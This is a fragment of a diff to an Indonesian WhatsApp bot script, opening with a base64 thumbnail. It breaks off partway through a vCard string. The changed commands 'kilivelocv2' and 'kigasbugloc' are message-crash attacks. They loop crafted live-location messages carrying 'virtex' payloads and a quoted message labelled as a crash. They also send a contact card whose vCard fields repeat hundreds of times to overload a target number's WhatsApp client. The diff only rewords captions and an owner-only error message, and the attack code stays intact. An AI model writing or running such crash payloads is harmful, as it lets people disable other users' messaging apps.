 						"jpegThumbnail": "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"
 }
@@ -7448,7 +7513,7 @@ jobotz.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.
 }
 break
 case 'kilivelocv2':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -7456,7 +7521,7 @@ res = generateWAMessageFromContent(m.chat,{
 "liveLocationMessage": {
 "degreesLatitude": -7.8374838,
 "degreesLongitude": 727.8383838,
-"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ 💊\n\n${philips} ${virtex3}`,
+"caption": `Full Album Twice\n\n${philips} ${virtex3}`,
 "sequenceNumber": "1532280505",
 "thumbnail": virgam,
 "contextInfo": {
@@ -7469,7 +7534,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: { //INI GUA KASIH QUOTED CRASH JANGAN DI GANTI 
 liveLocationMessage: {
-caption: `By: ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+caption: `By: ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
@@ -7478,15 +7543,15 @@ jobotz.relayMessage(m.chat, res.message, { messageId: res.key.id,})
 }
 break
 case 'kigasbugloc': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
-let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 